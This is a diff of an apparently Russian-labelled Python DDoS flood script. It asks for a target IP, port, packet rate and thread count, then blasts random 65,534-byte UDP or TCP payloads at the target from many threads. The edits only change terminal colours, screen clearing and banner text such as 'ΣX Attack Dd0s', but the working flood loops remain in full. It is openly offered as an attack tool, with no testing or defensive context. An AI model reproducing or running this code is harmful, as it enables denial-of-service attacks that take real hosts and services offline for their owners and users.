@@ -29,23 +29,21 @@ print("""\033[93m
 """)
 time.sleep(2)
 print()
-choice = str(input("\033[94m ╠═══[\033[93m МЕТОД [×] METHODS [UDP/TCP] \033[94m] •\n ╚════> \033[1m"))
+choice = str(input("\033[94m ╠═══[\033[93m МЕТОД [×] METHODS [UDP/TCP] \033[94m] •\n ╚════> \033[0m"))
 time.sleep(1)
-os.system('cls' if os.name=='nt' else 'clear')
 
-ip = str(input("\033[94m ╠═══[\033[93m Ваша Цель IP \033[94m] •\n ╚════> \033[1m"))
+ip = str(input("\033[94m ╠═══[\033[93m Ваша Цель IP \033[94m] •\n ╚════> \033[0m"))
 time.sleep(1)
-os.system('cls' if os.name=='nt' else 'clear')
 
-port = int(input("\033[94m ╠═══[\033[93m ПОРТ [×] PORT \033[94m] •\n ╚════> \033[1m"))
+port = int(input("\033[94m ╠═══[\033[93m ПОРТ [×] PORT \033[94m] •\n ╚════> \033[0m"))
 time.sleep(1)
-os.system('cls' if os.name=='nt' else 'clear')
 
-times = int(input("\033[94m ╠═══[\033[93m ПАКЕТЫ/s [×] PACKETS \033[94m] •\n ╚════> \033[1m"))
+times = int(input("\033[94m ╠═══[\033[93m ПАКЕТЫ/s [×] PACKETS \033[94m] •\n ╚════> \033[0m"))
 time.sleep(1)
-os.system('cls' if os.name=='nt' else 'clear')
 
-threads = int(input("\033[94m ╠═══[\033[93m ПОТОКИ [800] THREADS \033[94m] •\n ╚════> \033[1m"))
+threads = int(input("\033[94m ╠═══[\033[93m ПОТОКИ [800] THREADS \033[94m] •\n ╚════> \033[0m"))
+time.sleep(2)
+os.system('cls' if os.name=='nt' else 'clear')
 
 def run():
   data = random._urandom(65534)
@@ -56,7 +54,7 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +"ΣXCITΣD Attack")
+      print(i +"\033[93m ΣX Attack Dd0s")
     except:
       print(" DOWN!!")
 
@@ -70,10 +68,10 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" ΣXCITΣD!!!")
+      print(i +" ΣX !!!")
     except:
       s.close()
-      print("[*] Error")
+      print("\033[91m[*] Error")
 
 for y in range(threads):
   if choice == 'y':
